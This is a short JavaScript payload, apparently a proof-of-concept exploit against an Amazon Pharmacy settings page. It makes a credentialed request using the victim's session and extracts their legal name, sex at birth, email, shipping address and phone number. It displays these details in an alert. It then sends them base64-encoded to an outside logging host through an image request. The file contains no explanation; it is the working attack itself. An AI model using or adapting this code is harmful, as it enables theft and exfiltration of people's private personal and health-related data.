function decodeHtml(html) {
    var txt = document.createElement("textarea");
    txt.innerHTML = html;
    return txt.value;
}
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://pharmacy.amazon.com/dashboard/settings");
xhr.withCredentials = true;
xhr.onload = function() {
    var text2alert = "";
	const parser = new DOMParser();
	const htmlDoc = parser.parseFromString(this.responseText, 'text/html');
	text2alert += "Name: " + htmlDoc.getElementById("settings-legal-name").attributes[2].value + "\n"
  text2alert += "Sex: " + htmlDoc.getElementById("settings-sex-at-birth").attributes[2].value + "\n"
  text2alert += "Email: " + htmlDoc.getElementById("settings-communication").attributes[2].value + "\n"
  text2alert += "Shipping Address: " + decodeHtml(decodeHtml(htmlDoc.getElementById("settings-shipping-address").attributes[2].value)) + "\n"
  text2alert += "Phone Number: " + htmlDoc.getElementById("settings-profile").attributes[2].value + "\n"
  alert(text2alert)
  new Image().src="https://icollab.info/log/?data="+encodeURI(btoa(text2alert));
}

xhr.send()
